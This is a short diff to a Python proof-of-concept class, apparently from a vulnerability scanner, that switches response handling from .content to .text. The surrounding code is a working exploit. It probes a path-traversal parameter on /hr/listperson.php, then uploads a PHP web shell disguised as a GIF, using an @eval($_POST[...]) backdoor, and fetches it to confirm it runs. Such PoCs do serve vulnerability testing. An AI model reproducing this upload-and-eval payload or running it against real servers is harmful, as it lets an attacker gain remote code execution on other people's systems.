@@ -51,7 +51,7 @@ class Poc(ABPoc):
             payload = 'FidTpl[list]=../images/default/default.js'
             file_path = "/hr/listperson.php?%s" % payload
             verify_url = self.target + file_path
-            html = requests.get(verify_url).content
+            html = requests.get(verify_url).text
 
             if 'var evt = (evt) ? evt : ((window.event) ? window.event : "");' in html:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
@@ -68,7 +68,7 @@ class Poc(ABPoc):
                 'test.gif', 'Gif89a <?php echo(md5("bb2"));@eval($_POST["bb2"]);', 'image/gif')}
             gif_data = {'action': 'upload'}
             upload_content = requests.post(
-                upload_file_url, files=gif_file, data=gif_data).content
+                upload_file_url, files=gif_file, data=gif_data).text
 
             # 获取文件的地址   get file url
             pic_reg = re.compile(
@@ -81,7 +81,7 @@ class Poc(ABPoc):
             webshell = '%s%s' % (self.target, file_path)
 
             # 验证是否成功  check
-            page_content = requests.get(webshell).content
+            page_content = requests.get(webshell).text
             if '0c72305dbeb0ed430b79ec9fc5fe8505' in page_content:
                 #args['success'] = True
                 #args['poc_ret']['webshell'] = webshell
